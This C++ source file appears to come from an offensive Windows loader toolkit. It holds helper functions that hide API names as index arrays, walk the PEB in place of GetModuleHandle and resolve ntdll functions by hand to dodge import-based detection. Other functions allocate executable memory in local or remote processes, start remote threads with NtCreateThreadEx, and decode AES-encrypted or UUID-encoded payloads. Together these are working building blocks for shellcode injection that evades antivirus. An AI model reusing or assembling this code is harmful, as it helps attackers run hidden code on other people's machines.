/* ---- Includes ----- */
#include "structures.h"
#include "functions.h"

/* Obfuscator Strings */
char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._123456789";
char big_numbers[] = "1234567.890";

/* [CUSTOM Obfuscated Strings.] */
int str_LdrGetProcedureAddress[] = { 37,3,17,32,4,19,41,17,14,2,4,3,20,17,4,26,3,3,17,4,18,18 };
int str_ntdll_offsets[] = { 39, 45, 29, 37, 37, 52, 29, 37, 37 };
int str_LdrLoadDll[] = { 37,3,17,37,14,0,3,29,11,11 };
int str_NtAllocateVirtualMemory[] = { 39,19,26,11,11,14,2,0,19,4,47,8,17,19,20,0,11,38,4,12,14,17,24 };
int str_NtFreeVirtualMemory[] = { 39,19,31,17,4,4,47,8,17,19,20,0,11,38,4,12,14,17,24 };
int str_GetProcAddress[] = { 32,4,19,41,17,14,2,26,3,3,17,4,18,18, };
int str_NtProtectVirtualMemory[] = {39,19,41,17,14,19,4,2,19,47,8,17,19,20,0,11,38,4,12,14,17,24};
int str_NtCreateThreadEx[] = { 39, 19, 28, 17, 4, 0, 19, 4, 45, 7, 17, 4, 0, 3, 30, 23 };
int str_NtWriteProcessMemory[] = { 39,19,48,17,8,19,4,41,17,14,2,4,18,18,38,4,12,14,17,24 };
/* [CUSTOM rockyObfuscation to turn offsets into it's original string of big_string] */
void rockyObfuscation(char* big_string, char* original_string) {
	for (int i = 0; i < strlen(original_string); i++) {
		for (int j = 0; j < strlen(big_string); ++j) {
			if (original_string[i] == big_string[j]) {
				printf("%d,", j);
			}
		}
	}
}

/* [CUSTOM rockyGetString to get original string from the obfuscation] */
string rockyGetString(int offsets[], char* big_string, int sizeof_offset) {
	string empty_string = "";
	for (int i = 0; i < sizeof_offset / 4; ++i) {
		char character = big_string[offsets[i]];
		empty_string += character;
	}
	return empty_string;
}

/* [CUSTOM stringtoWstring converter] */
wstring stringToWstring(const string& str) {
	wstring_convert<codecvt_utf8<wchar_t>> converter;
	return converter.from_bytes(str);
}
/* [CUSTOM rockyGetProcAddress function */
void* rockyGetProcAddress(HMODULE hModule, const char* functionName) {
	string deob_ntdll = rockyGetString(str_ntdll_offsets, big_string, sizeof(str_ntdll_offsets)).c_str();
	wstring deobfuscated_ntdll = stringToWstring(deob_ntdll);

	HMODULE NTDLL = rockyGetModuleHandle2(deobfuscated_ntdll.c_str());
	if (!NTDLL) {
		rockyPrintColor(red, "Failed to load NTDLL");
		return NULL;

	}
	std::string deobbed_getproc_str = rockyGetString(str_LdrGetProcedureAddress, big_string, sizeof(str_LdrGetProcedureAddress));
	const char* deobbed_getproc = deobbed_getproc_str.c_str();

	s_LdrGetProcedureAddress LdrGetProcedureAddress = (s_LdrGetProcedureAddress)GetProcAddress(NTDLL, deobbed_getproc);

	if (!LdrGetProcedureAddress) {
		rockyPrintColor(red, "Failed to get LdrGetProcedureAddress");
		return NULL;
	}
	ANSI_STRING ansiFunctionName;
	RtlInitAnsiString(&ansiFunctionName, functionName);
	PVOID functionAddress = NULL;

	NTSTATUS status = LdrGetProcedureAddress(hModule, &ansiFunctionName, 0, &functionAddress);

	if (status != 0) {
		rockyPrintColor(red, "Failed to retrive the address for %s", functionName);
		return NULL;
	}
	return functionAddress;
}

/* [CUSTOM GetModuleHandle Function helper that takes 2 strings, convert them to lowercase, compare them, and return true if both are equal, false otherwise] */
BOOL IsStringEqual(IN LPCWSTR Str1, IN LPCWSTR Str2) {

	WCHAR lStr1[MAX_PATH], lStr2[MAX_PATH];

	int	len1 = lstrlenW(Str1), len2 = lstrlenW(Str2);

	int		i = 0,
		j = 0;

	if (len1 >= MAX_PATH || len2 >= MAX_PATH)
		return FALSE;

	for (i = 0; i < len1; i++) {
		lStr1[i] = (WCHAR)tolower(Str1[i]);
	}
	lStr1[i++] = L'\0';


	for (j = 0; j < len2; j++) {
		lStr2[j] = (WCHAR)tolower(Str2[j]);
	}
	lStr2[j++] = L'\0';


	if (lstrcmpiW(lStr1, lStr2) == 0)
		return TRUE;

	return FALSE;
}

/* [CUSTOM GetModuleHandle Implementation Function that replaces GetModuleHandle, uses pointers to enumerate in the DLLs] */
HMODULE rockyGetModuleHandle(IN LPCWSTR szModuleName) {

	// getting peb
#ifdef _WIN64 // if compiling as x64
	PPEB					pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32 // if compiling as x32
	PPEB					pPeb = (PEB*)(__readfsdword(0x30));
#endif

	// geting Ldr
	PPEB_LDR_DATA			pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
	// getting the first element in the linked list (contains information about the first module)
	PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

	while (pDte) {

		// if not null
		if (pDte->FullDllName.Length != NULL) {

			// check if both equal
			if (IsStringEqual(pDte->FullDllName.Buffer, szModuleName)) {
				//wprintf(L"[+] Found Dll \"%s\" \n", pDte->FullDllName.Buffer);
#ifdef STRUCTS
				return (HMODULE)(pDte->InInitializationOrderLinks.Flink);
#else
				return (HMODULE)pDte->Reserved2[0];
#endif // STRUCTS

			}

			// wprintf(L"[i] \"%s\" \n", pDte->FullDllName.Buffer);
		}
		else {
			break;
		}

		// next element in the linked list
		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);

	}

	return NULL;
}

/* [CUSTOM GetModuleHandle Implementation Function that replaces GetModuleHandle, uses head and node to enumerate in DLL's uding doubly linked list concept] */
HMODULE rockyGetModuleHandle2(IN LPCWSTR szModuleName) {

#ifdef _WIN64
	PPEB					pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
	PPEB					pPeb = (PEB*)(__readfsdword(0x30));
#endif

	PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pPeb->Ldr->InMemoryOrderModuleList.Flink);

	// getting the head of the linked list ( used to get the node & to check the end of the list)
	PLIST_ENTRY				pListHead = (PLIST_ENTRY)&pPeb->Ldr->InMemoryOrderModuleList;
	// getting the node of the linked list
	PLIST_ENTRY				pListNode = (PLIST_ENTRY)pListHead->Flink;

	do
	{
		if (pDte->FullDllName.Length != NULL) {
			if (IsStringEqual(pDte->FullDllName.Buffer, szModuleName)) {
				//wprintf(L"[+] Found Dll \"%s\" \n", pDte->FullDllName.Buffer);
#ifdef STRUCTS
				return (HMODULE)(pDte->InInitializationOrderLinks.Flink);
#else
				return (HMODULE)pDte->Reserved2[0];
#endif // STRUCTS
			}

			//wprintf(L"[i] \"%s\" \n", pDte->FullDllName.Buffer);

			// updating pDte to point to the next PLDR_DATA_TABLE_ENTRY in the linked list
			pDte = (PLDR_DATA_TABLE_ENTRY)(pListNode->Flink);

			// updating the node variable to be the next node in the linked list
			pListNode = (PLIST_ENTRY)pListNode->Flink;

		}

		// when the node is equal to the head, we reached the end of the linked list, so we break out of the loop
	} while (pListNode != pListHead);



	return NULL;
}

/* [CUSTOM LoadLibrary Implementation Function that replaces LoadLibrary] */
void* rockyLoadLibrary(const wchar_t* dllName) {
	UNICODE_STRING unicodeString;
	RtlInitUnicodeString(&unicodeString, dllName);

	wstring deobfuscated_ntdll = stringToWstring(rockyGetString(str_ntdll_offsets, big_string, sizeof(str_ntdll_offsets)).c_str());
	HMODULE NTDLL = rockyGetModuleHandle2(deobfuscated_ntdll.c_str());
	if (!NTDLL) {
		std::cerr << "Failed to load ntdll.dll" << std::endl;
		return NULL;
	}

	typedef NTSTATUS(NTAPI* s_LdrLoadDll)(
		PWSTR PathToFile,
		ULONG Flags,
		PUNICODE_STRING ModuleFileName,
		PHANDLE ModuleHandle
		);

	std::string deobbed_ldrloaddll = rockyGetString(str_LdrLoadDll, big_string, sizeof(str_LdrLoadDll));
	const char* deobbed_ldr_dll_load = deobbed_ldrloaddll.c_str();

	s_LdrLoadDll rockyLoadLibrary = (s_LdrLoadDll)rockyGetProcAddress(NTDLL, deobbed_ldr_dll_load);
	if (!rockyLoadLibrary) {
		std::cerr << "Failed to retrieve LdrLoadDll" << std::endl;
		return NULL;
	}

	HANDLE moduleHandle = NULL;
	NTSTATUS status = rockyLoadLibrary(NULL, 0, &unicodeString, &moduleHandle);
	if (status != 0) {
		std::cerr << "Failed to load DLL: " << dllName << std::endl;
		return NULL;
	}

	return (void*)moduleHandle;
}



/* [CUSTOM rockyPrintColor Implementation Function to print colors] */
void rockyPrintColor(ConsoleColor color, const char* format, ...) {
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, color);
	char buffer[1024];
	va_list args;
	va_start(args, format);
	vsnprintf(buffer, sizeof(buffer), format, args);
	va_end(args);
	printf("%s\n", buffer);
	SetConsoleTextAttribute(hConsole, default_color);
}

/* [CUSTOM HANDLES BASIC DATA rockAlloc Implementation to Allocate data to memory] */
NTSTATUS rockyAlloc(const void* data, size_t size, void** outAddress) {
	if (outAddress == NULL) {
		return STATUS_INVALID_PARAMETER;
	}
	*outAddress = NULL;

	std::string deobbed_ntdld = rockyGetString(str_ntdll_offsets, big_string, sizeof(str_ntdll_offsets));
	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
	std::wstring deobbed_ntdld_wstr = converter.from_bytes(deobbed_ntdld);
	const wchar_t* deobbed_ntdld_wchar = deobbed_ntdld_wstr.c_str();

	HMODULE NTDLL = rockyGetModuleHandle2(deobbed_ntdld_wchar);
	if (NTDLL == NULL) {
		return STATUS_DLL_NOT_FOUND;
	}

	const char* deobbed_ntallocmem = "NtAllocateVirtualMemory";
	//const char* deobbed_allocate_virtual_memory = deobbed_ntallocmem.c_str();

	s_NtAllocateVirtualMemory rockyAllocateVirtualMemory = (s_NtAllocateVirtualMemory)rockyGetProcAddress(NTDLL, deobbed_ntallocmem);
	if (rockyAllocateVirtualMemory == NULL) {
		return STATUS_NOT_FOUND;
	}

	PVOID baseAddress = NULL;
	SIZE_T regionSize = size;

	NTSTATUS status = rockyAllocateVirtualMemory(GetCurrentProcess(), &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (status != STATUS_SUCCESS) {
		return status;
	}

	memcpy(baseAddress, data, size);
	*outAddress = baseAddress;
	return STATUS_SUCCESS;
}

/* [CUSTOM HANDLES DIFFERENT PROCESS rockyAlloc Implmentation to Allocate data to memory, but with different process] */
NTSTATUS rockyAlloc(HANDLE hProcess, const void* data, size_t size, void** outAddress) {
	if (outAddress == NULL) {
		return STATUS_INVALID_PARAMETER;
	}
	*outAddress = NULL;

	std::string deobbed_ntdld = rockyGetString(str_ntdll_offsets, big_string, sizeof(str_ntdll_offsets));
	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
	std::wstring deobbed_ntdld_wstr = converter.from_bytes(deobbed_ntdld);
	const wchar_t* deobbed_ntdld_wchar = deobbed_ntdld_wstr.c_str();

	HMODULE NTDLL = rockyGetModuleHandle2(deobbed_ntdld_wchar);
	if (NTDLL == NULL) {
		return STATUS_DLL_NOT_FOUND;
	}

	std::string deobbed_ntallocmem = rockyGetString(str_NtAllocateVirtualMemory, big_string, sizeof(str_NtAllocateVirtualMemory));
	const char* deobbed_allocate_virtual_memory = deobbed_ntallocmem.c_str();

	s_NtAllocateVirtualMemory rockyAllocateVirtualMemory = (s_NtAllocateVirtualMemory)rockyGetProcAddress(NTDLL, deobbed_allocate_virtual_memory);
	if (rockyAllocateVirtualMemory == NULL) {
		return STATUS_NOT_FOUND;
	}

	PVOID baseAddress = NULL;
	SIZE_T regionSize = size;


	NTSTATUS status = rockyAllocateVirtualMemory(hProcess, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (status != STATUS_SUCCESS) {
		return status;
	}

	memcpy(baseAddress, data, size);
	*outAddress = baseAddress;
	return STATUS_SUCCESS;
}

/* [CUSTOM HANDLES STRING DATA rockyAlloc Implmentation to support string data] */
NTSTATUS rockyAlloc(const char* stringData, void** outAddress) {
	if (stringData == NULL || outAddress == NULL) {
		return STATUS_INVALID_PARAMETER;
	}

	size_t size = strlen(stringData) + 1; // +1 for null terminator
	return rockyAlloc(static_cast<const void*>(stringData), size, outAddress);
}

/* [CUSTOM rockyDealloc, used to free memory ] */
NTSTATUS rockyDealloc(void* pAddress) {
    if (pAddress == NULL) {
        return STATUS_INVALID_PARAMETER;
    }

    std::string deobbed_ntdld = rockyGetString(str_ntdll_offsets, big_string, sizeof(str_ntdll_offsets));
    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    std::wstring deobbed_ntdld_wstr = converter.from_bytes(deobbed_ntdld);
    const wchar_t* deobbed_ntdld_wchar = deobbed_ntdld_wstr.c_str();
    HMODULE NTDLL_HANDLE = rockyGetModuleHandle2(deobbed_ntdld_wchar);
    if (NTDLL_HANDLE == NULL) {
        return STATUS_DLL_NOT_FOUND;
    }

    std::string deobbed_ntfreevirtmem = rockyGetString(str_NtFreeVirtualMemory, big_string, sizeof(str_NtFreeVirtualMemory));
    const char* deobbed_free_virt_mem = deobbed_ntfreevirtmem.c_str();

    s_NtFreeVirtualMemory rockyFreeVirtualMemory = (s_NtFreeVirtualMemory)rockyGetProcAddress(NTDLL_HANDLE, deobbed_free_virt_mem);
    if (rockyFreeVirtualMemory == NULL) {
        return STATUS_NOT_FOUND;
    }

    SIZE_T regionSize = 0;
    NTSTATUS status = rockyFreeVirtualMemory(GetCurrentProcess(), &pAddress, &regionSize, MEM_RELEASE);
    if (status != STATUS_SUCCESS) {
        return status;
    }

    return STATUS_SUCCESS;
}

/* [CUSTOM rockyPrintAllocated function used to retrieve and print data from allocated memory] */
void rockyPrintAllocated(const void* pAddress, size_t size) {
	if (pAddress == NULL) {
		rockyPrintColor(red, "Invalid Address");
		return;
	}

	const unsigned char* bytePtr = static_cast<const unsigned char*>(pAddress);
	rockyPrintColor(green, "[*] rockyPrintAllocated: working ");
	for (size_t i = 0; i < size; ++i) {
		printf("%02X ", bytePtr[i]);
	}
	printf("\n");
}

NTSTATUS rockyVirtualProtect(HANDLE hProcess, PVOID baseAddress, SIZE_T regionSize, ULONG newProtect, PULONG oldProtect) {
	std::string deobbed_ntdld = rockyGetString(str_ntdll_offsets, big_string, sizeof(str_ntdll_offsets));
	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
	std::wstring deobbed_ntdld_wstr = converter.from_bytes(deobbed_ntdld);
	const wchar_t* deobbed_ntdld_wchar = deobbed_ntdld_wstr.c_str();
	HMODULE NTDLL = rockyGetModuleHandle2(deobbed_ntdld_wchar);
	if (NTDLL == NULL) {
		rockyPrintColor(red, "Failed to get a handle on NTDLL");
		return STATUS_DLL_NOT_FOUND;
	}

	typedef NTSTATUS(NTAPI* s_NtProtectVirtualMemory)(
		HANDLE ProcessHandle,
		PVOID* BaseAddress,
		PSIZE_T RegionSize,
		ULONG NewProtect,
		PULONG OldProtect
		);

	std::string deobbed_ntprotect = rockyGetString(str_NtProtectVirtualMemory, big_string, sizeof(str_NtProtectVirtualMemory));
	const char* deobbed_ntprotect_mem = deobbed_ntprotect.c_str();
	s_NtProtectVirtualMemory pNtProtectVirtualMemory = (s_NtProtectVirtualMemory)rockyGetProcAddress(NTDLL, deobbed_ntprotect_mem);
	if (pNtProtectVirtualMemory == NULL) {
		rockyPrintColor(red, "Failed to get address of NtProtectVirtualMemory");
		return STATUS_NOT_FOUND;
	}

	PVOID baseAddressPtr = baseAddress;
	SIZE_T regionSizeVal = regionSize;

	NTSTATUS status = pNtProtectVirtualMemory(hProcess, &baseAddressPtr, &regionSizeVal, newProtect, oldProtect);
	if (status != STATUS_SUCCESS) {
		std::cerr << "NtProtectVirtualMemory failed with status: " << status << " (" << GetLastError() << ")" << std::endl;
		return status;
	}

	return STATUS_SUCCESS;
}
NTSTATUS rockyNtClose(HANDLE handle) {
	HMODULE NTDLL = rockyGetModuleHandle2(L"ntdll.dll");
	if (NTDLL == NULL) {
		std::cerr << "Failed to get handle to NTDLL." << std::endl;
		return STATUS_DLL_NOT_FOUND;
	}

	s_NtClose pNtClose = (s_NtClose)rockyGetProcAddress(NTDLL, "NtClose");
	if (pNtClose == NULL) {
		std::cerr << "Failed to get address of NtClose." << std::endl;
		return STATUS_NOT_FOUND;
	}

	return pNtClose(handle);
}
/* [CUSTOM rockyCreateThread function used to create a thread in the virtual address space of a specified process] */
NTSTATUS rockyCreateThreadEx(_Out_ PHANDLE ThreadHandle,_In_ ACCESS_MASK DesiredAccess,_In_opt_ POBJECT_ATTRIBUTES64 ObjectAttributes, _In_ HANDLE ProcessHandle,_In_ LPTHREAD_START_ROUTINE StartRoutine,_In_opt_ PVOID Argument,_In_ ULONG CreateFlags,_In_ SIZE_T ZeroBits,_In_ SIZE_T StackSize,_In_ SIZE_T MaximumStackSize,_In_opt_ PPS_ATTRIBUTE_LIST AttributeList) {
	std::string deobbed_ntdld = rockyGetString(str_ntdll_offsets, big_string, sizeof(str_ntdll_offsets));
	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
	std::wstring deobbed_ntdld_wstr = converter.from_bytes(deobbed_ntdld);
	const wchar_t* deobbed_ntdld_wchar = deobbed_ntdld_wstr.c_str();
	HMODULE NTDLL = rockyGetModuleHandle2(deobbed_ntdld_wchar);
	if (NTDLL == NULL) {
		rockyPrintColor(red, "Failed to get a handle on NTDLL");
		return STATUS_DLL_NOT_FOUND;
	}
	std::string deobbed_ntcreatethread = rockyGetString(str_NtCreateThreadEx, big_string, sizeof(str_NtCreateThreadEx));
	const char* deobbed_ntcreate_thread = deobbed_ntcreatethread.c_str();
	s_NtCreateThreadEx pNtCreateThreadEx = (s_NtCreateThreadEx)rockyGetProcAddress(NTDLL, deobbed_ntcreate_thread);
	if (pNtCreateThreadEx == NULL) {
		rockyPrintColor(red, "Failed");
		return STATUS_NOT_FOUND;
	}
	return pNtCreateThreadEx(
		ThreadHandle,
		DesiredAccess,
		ObjectAttributes,
		ProcessHandle,
		(PUSER_THREAD_START_ROUTINE)StartRoutine,
		Argument,
		CreateFlags,
		ZeroBits,
		StackSize,
		MaximumStackSize,
		AttributeList
	);
}

VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize) {

	for (int i = 0; i < sSize; i++) {
		pByte[i] = (BYTE)rand() % 0xFF;
	}

}
VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

	printf("unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}
		if (i < Size - 1) {
			printf("0x%0.2X, ", Data[i]);
		}
		else {
			printf("0x%0.2X ", Data[i]);
		}
	}

	printf("};\n\n\n");

}
BOOL InstallAesDecryption(PAES pAes) {

	BOOL				bSTATE = TRUE;

	BCRYPT_ALG_HANDLE		hAlgorithm = NULL;
	BCRYPT_KEY_HANDLE		hKeyHandle = NULL;

	ULONG				cbResult = NULL;
	DWORD				dwBlockSize = NULL;
	DWORD				cbKeyObject = NULL;
	PBYTE				pbKeyObject = NULL;

	PBYTE				pbPlainText = NULL;
	DWORD				cbPlainText = NULL,

		STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	if (dwBlockSize != 16) {
		bSTATE = FALSE; goto _EndOfFunc;
	}
	pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
	if (pbKeyObject == NULL) {
		bSTATE = FALSE; goto _EndOfFunc;
	}
	STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
	if (pbPlainText == NULL) {
		bSTATE = FALSE; goto _EndOfFunc;
	}
	STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

_EndOfFunc:
	if (hKeyHandle) {
		BCryptDestroyKey(hKeyHandle);
	}
	if (hAlgorithm) {
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
	}
	if (pbKeyObject) {
		HeapFree(GetProcessHeap(), 0, pbKeyObject);
	}
	if (pbPlainText != NULL && bSTATE) {
		pAes->pPlainText = pbPlainText;
		pAes->dwPlainSize = cbPlainText;
	}
	return bSTATE;

}
BOOL InstallAesEncryption(PAES pAes) {

	BOOL 			bSTATE = TRUE;

	BCRYPT_ALG_HANDLE	hAlgorithm = NULL;
	BCRYPT_KEY_HANDLE	hKeyHandle = NULL;

	ULONG 			cbResult = NULL;
	DWORD 			dwBlockSize = NULL;

	DWORD 			cbKeyObject = NULL;
	PBYTE 			pbKeyObject = NULL;

	PBYTE 			pbCipherText = NULL;
	DWORD 			cbCipherText = NULL;

	NTSTATUS STATUS = NULL;
	STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	if (dwBlockSize != 16) {
		bSTATE = FALSE; goto _EndOfFunc;
	}

	pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
	if (pbKeyObject == NULL) {
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
	STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Generating the key object from the AES key "pAes->pKey". The output will be saved in pbKeyObject and will be of size cbKeyObject 
	STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Running BCryptEncrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbCipherText
	STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText, (ULONG)pAes->dwPlainSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptEncrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherText);
	if (pbCipherText == NULL) {
		bSTATE = FALSE; goto _EndOfFunc;
	}

	STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText, (ULONG)pAes->dwPlainSize, NULL, pAes->pIv, IVSIZE, pbCipherText, cbCipherText, &cbResult, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptEncrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Clean up
_EndOfFunc:
	if (hKeyHandle) {
		BCryptDestroyKey(hKeyHandle);
	}
	if (hAlgorithm) {
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
	}
	if (pbKeyObject) {
		HeapFree(GetProcessHeap(), 0, pbKeyObject);
	}
	if (pbCipherText != NULL && bSTATE) {
		pAes->pCipherText = pbCipherText;
		pAes->dwCipherSize = cbCipherText;
	}
	return bSTATE;

}



/* [CUSTOM rockyAes_encrypt] */
BOOL rockyAes_encrypt(IN PVOID pPlainTextData, IN DWORD sPlainTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pCipherTextData, OUT DWORD* sCipherTextSize) {

	if (pPlainTextData == NULL || sPlainTextSize == NULL || pKey == NULL || pIv == NULL)
		return FALSE;

	AES Aes;
	Aes.pKey = pKey;
	Aes.pIv = pIv;
	Aes.pPlainText = static_cast<PBYTE>(pPlainTextData); // Cast to PBYTE
	Aes.dwPlainSize = sPlainTextSize;

	if (!InstallAesEncryption(&Aes)) {
		return FALSE;
	}

	*pCipherTextData = static_cast<PVOID>(Aes.pCipherText); // Cast to PVOID
	*sCipherTextSize = Aes.dwCipherSize;

	return TRUE;
}

/* [CUSTOM rockyAes_decrypt] */
BOOL rockyAes_decrypt(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {

	if (pCipherTextData == NULL || sCipherTextSize == NULL || pKey == NULL || pIv == NULL)
		return FALSE;

	AES Aes{};

	Aes.pKey = pKey;

	Aes.pIv = pIv;

	Aes.pCipherText = (PBYTE)pCipherTextData;
	Aes.dwCipherSize = sCipherTextSize;
	Aes.pPlainText = NULL;
	Aes.dwPlainSize = 0;

	if (!InstallAesDecryption(&Aes)) {
		return FALSE;
	}

	*pPlainTextData = Aes.pPlainText;
	*sPlainTextSize = Aes.dwPlainSize;

	return TRUE;
}


BOOL rockyUUID_Deobfuscator(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE           pBuffer = NULL,
		TmpBuffer = NULL;

	SIZE_T          sBuffSize = NULL;

	PCSTR           Terminator = NULL;

	NTSTATUS        STATUS = NULL;

	// Getting the UuidFromStringA function's base address from Rpcrt4.dll
	HMODULE hModule = (HMODULE)rockyLoadLibrary(TEXT("RPCRT4"));
	fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)rockyGetProcAddress(hModule, "UuidFromStringA");
	if (pUuidFromStringA == NULL) {
		printf("[!] rockyGetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	sBuffSize = NmbrOfElements * 16;
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	TmpBuffer = pBuffer;


	for (int i = 0; i < NmbrOfElements; i++) {
		// UuidArray[i] is a single UUid address from the array UuidArray
		if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
			printf("[!] UuidFromStringA  Failed At [%s] With Error 0x%0.8X\n", UuidArray[i], STATUS);
			return FALSE;
		}

		TmpBuffer = (PBYTE)(TmpBuffer + 16);
	}

	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;
	return TRUE;
}



